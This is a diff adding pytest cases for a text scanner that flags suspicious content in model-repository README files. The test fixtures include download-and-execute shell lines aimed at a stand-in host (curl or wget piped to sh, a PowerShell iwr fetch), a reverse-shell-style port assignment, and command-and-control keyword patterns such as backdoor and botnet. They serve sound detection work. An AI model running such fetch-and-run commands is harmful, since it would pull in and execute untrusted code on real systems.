@@ -158,6 +158,8 @@ def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
     [
         "Project URL: https://example.com/project\n",
         "Dataset URL: https://example.com/dataset\n",
+        "class labels are documented at https://example.com/classes\n",
+        "def examples are documented at https://example.com/functions\n",
     ],
 )
 def test_text_scanner_generic_documentation_url_labels_are_informational(
@@ -172,6 +174,29 @@ def test_text_scanner_generic_documentation_url_labels_are_informational(
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'class Loader: "https://evil.example/payload"\n',
+        'def load(): return "https://evil.example/payload"\n',
+    ],
+)
+def test_text_scanner_python_definitions_with_urls_remain_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
 
 
 @pytest.mark.parametrize(
@@ -333,6 +358,8 @@ def test_text_scanner_python_prompt_import_prose_remains_informational(tmp_path:
         "1. import requests\n",
         "> import socket\n",
         "> - >>> import requests\n",
+        "`import socket`\n",
+        "`from requests import get`\n",
     ],
 )
 def test_text_scanner_markdown_prefixed_imports_remain_actionable(tmp_path: Path, content: str) -> None:
@@ -356,6 +383,7 @@ def test_text_scanner_markdown_prefixed_imports_remain_actionable(tmp_path: Path
     [
         "- import requests before downloading weights.\n",
         "> import socket for troubleshooting examples.\n",
+        "`import socket for troubleshooting examples.`\n",
     ],
 )
 def test_text_scanner_markdown_prefixed_import_prose_is_informational(tmp_path: Path, content: str) -> None:
@@ -465,6 +493,8 @@ def test_text_scanner_earlier_network_library_call_is_not_hidden_by_later_prose(
         'sh -c "sudo curl https://evil.example/payload | sh"\n',
         'bash -c "sudo -u nobody HTTPS_PROXY=http://proxy.internal wget https://evil.example/payload"\n',
         'echo ready; sh -c "sudo curl https://evil.example/payload | sh"\n',
+        "PS> iwr https://evil.example/payload\n",
+        "`$ curl https://evil.example/payload | sh`\n",
         "$(wget https://evil.example/payload)\n",
         "`curl https://evil.example/payload`\n",
         'echo "$(curl https://evil.example/payload)"\n',
@@ -484,12 +514,20 @@ def test_text_scanner_documentation_shell_substitution_remains_actionable(
     assert determine_exit_code(aggregate) == 1
 
 
-def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
+@pytest.mark.parametrize(
+    "content",
+    [
         "Use sh -c with sudo and curl when appropriate; see https://docs.example.com/shell.\n",
-        encoding="utf-8",
-    )
+        "PS> is the prompt shown at https://docs.example.com/powershell.\n",
+        "`Use curl for downloads`; see https://docs.example.com/shell.\n",
+    ],
+)
+def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
@@ -913,7 +951,10 @@ def test_text_scanner_routes_rst_documentation_sidecars(tmp_path: Path) -> None:
 
 def test_text_scanner_documentation_benign_cc_prose_is_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
-    text_path.write_text("This model is not malware.\nBackdoor robustness benchmark.\n", encoding="utf-8")
+    text_path.write_text(
+        "This model is not malware.\nBackdoor robustness benchmark.\nThis model has no backdoors.\nWithout botnets.\n",
+        encoding="utf-8",
+    )
 
     result = TextScanner().scan(str(text_path))
 
@@ -922,7 +963,7 @@ def test_text_scanner_documentation_benign_cc_prose_is_informational(tmp_path: P
         for check in result.checks
         if check.name == "Network Communication Detection" and check.details.get("type") == "cc_pattern"
     ]
-    assert {check.details.get("pattern") for check in cc_checks} == {"malware", "backdoor"}
+    assert {check.details.get("pattern") for check in cc_checks} == {"malware", "backdoor", "botnet"}
     assert all(check.severity == IssueSeverity.INFO for check in cc_checks)
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
@@ -937,6 +978,21 @@ def test_text_scanner_documentation_cc_admission_remains_actionable(tmp_path: Pa
         check.name == "Network Communication Detection"
         and check.details.get("type") == "cc_pattern"
         and check.details.get("pattern") == "backdoor"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_text_scanner_plural_cc_admission_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("This model installs backdoors and botnets.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") in {"backdoor", "botnet"}
         and check.severity == IssueSeverity.CRITICAL
         for check in result.checks
     )
@@ -982,7 +1038,10 @@ def test_text_scanner_later_cc_admission_is_not_hidden_by_benign_prose(tmp_path:
 def test_text_scanner_documentation_placeholder_secrets_are_ignored(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
-        "client_secret = YOUR_CLIENT_SECRET\nsecret = <CLIENT_SECRET>\n",
+        "client_secret = YOUR_CLIENT_SECRET\n"
+        "secret = <CLIENT_SECRET>\n"
+        "client_secret = clientSecretValue\n"
+        "secret = <clientSecretValue>\n",
         encoding="utf-8",
     )
 
@@ -1035,6 +1094,22 @@ def test_text_scanner_documentation_port_prose_is_informational(tmp_path: Path, 
 def test_text_scanner_documentation_port_assignment_remains_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text("PORT=4444\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "suspicious_port"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_later_port_assignment_is_not_hidden_by_prose(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("SSH uses port 22.\nport=22\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
